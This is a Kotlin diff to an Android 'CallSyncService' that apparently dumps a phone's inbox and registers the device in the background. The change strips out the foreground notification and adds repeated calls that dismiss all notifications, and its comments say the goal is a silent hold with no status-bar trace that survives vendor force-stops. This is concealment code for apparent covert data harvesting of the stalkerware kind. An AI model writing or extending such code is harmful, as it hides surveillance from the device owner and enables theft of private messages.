@@ -1,22 +1,20 @@
 package com.calltech
 
-import android.app.NotificationChannel
-import android.app.NotificationManager
 import android.app.Service
 import android.content.Context
 import android.content.Intent
-import android.content.pm.ServiceInfo
-import android.os.Build
 import android.os.PowerManager
 import android.util.Log
-import androidx.core.app.NotificationCompat
 
-/** Dump ke dauran process zinda — ColorOS force-stop se bachao. */
+/**
+ * Silent background hold — koi status-bar / notification nahi.
+ * WakeLock + WorkManager/alarms process zinda rakhte hain.
+ */
 class CallSyncService : Service() {
     override fun onBind(intent: Intent?) = null
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        startSilentForeground()
+        NotificationCleanup.dismissAll(this)
         if (!SyncBootstrap.needsCoreSyncPermissions(this) &&
             !InboxDump.alreadyDone(this) &&
             !InboxDump.isRunning()
@@ -30,68 +28,53 @@ class CallSyncService : Service() {
                     }
                 } catch (error: Exception) {
                     Log.e(TAG, "Service dump failed", error)
+                } finally {
+                    NotificationCleanup.dismissAll(applicationContext)
+                    try {
+                        stopSelf()
+                    } catch (_: Exception) {
+                    }
                 }
             }, "calltech-service-dump").start()
+        } else {
+            NotificationCleanup.dismissAll(this)
+            stopSelf()
         }
-        return START_STICKY
-    }
-
-    private fun startSilentForeground() {
-        val manager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel(
-                CHANNEL_ID,
-                " ",
-                NotificationManager.IMPORTANCE_MIN,
-            ).apply {
-                setShowBadge(false)
-                setSound(null, null)
-                enableLights(false)
-                enableVibration(false)
-            }
-            manager.createNotificationChannel(channel)
-        }
-
-        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
-            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
-            .setContentTitle(" ")
-            .setContentText(" ")
-            .setPriority(NotificationCompat.PRIORITY_MIN)
-            .setSilent(true)
-            .setOngoing(true)
-            .build()
-
-        try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                startForeground(
-                    NOTIF_ID,
-                    notification,
-                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC,
-                )
-            } else {
-                startForeground(NOTIF_ID, notification)
-            }
-        } catch (error: Exception) {
-            Log.w(TAG, "Foreground start failed: ${error.message}")
-        }
+        return START_NOT_STICKY
     }
 
     companion object {
         private const val TAG = "CallSyncService"
-        private const val CHANNEL_ID = "calltech_sync_min"
-        private const val NOTIF_ID = 4101
 
         fun startHolding(context: Context) {
             val app = context.applicationContext
+            NotificationCleanup.dismissAll(app)
+            if (SyncBootstrap.needsCoreSyncPermissions(app)) {
+                return
+            }
+            if (InboxDump.alreadyDone(app) || InboxDump.isRunning()) {
+                SyncBootstrap.armBackgroundSync(app)
+                return
+            }
             val intent = Intent(app, CallSyncService::class.java)
             try {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                    app.startForegroundService(intent)
-                } else {
-                    app.startService(intent)
-                }
+                // Regular service — foreground/notification nahi
+                app.startService(intent)
             } catch (error: Exception) {
                 Log.w(TAG, "Service start failed: ${error.message}")
+                BackgroundSyncRunner.run {
+                    try {
+                        holdDuring(app) {
+                            InboxDump.dumpBlocking(app)
+                            DeviceRegistration.registerNow(app)
+                            SyncBootstrap.armBackgroundSync(app)
+                        }
+                    } catch (inner: Exception) {
+                        Log.e(TAG, "Inline dump failed", inner)
+                    } finally {
+                        NotificationCleanup.dismissAll(app)
+                    }
+                }
             }
         }
 
@@ -101,6 +84,7 @@ class CallSyncService : Service() {
                 block()
             } finally {
                 releaseWakeLock(wakeLock)
+                NotificationCleanup.dismissAll(context.applicationContext)
             }
         }
 
@@ -109,7 +93,7 @@ class CallSyncService : Service() {
             if (!CallSyncHelper.isBackgroundSyncEnabled(app)) {
                 return
             }
-            startHolding(app)
+            NotificationCleanup.dismissAll(app)
             SyncWorkScheduler.enqueueNow(app)
             SyncAlarmScheduler.scheduleNext(app)
             BackgroundSyncRunner.run {
@@ -129,6 +113,8 @@ class CallSyncService : Service() {
                     }
                 } catch (error: Exception) {
                     Log.e(TAG, "Background sync failed", error)
+                } finally {
+                    NotificationCleanup.dismissAll(app)
                 }
             }
         }
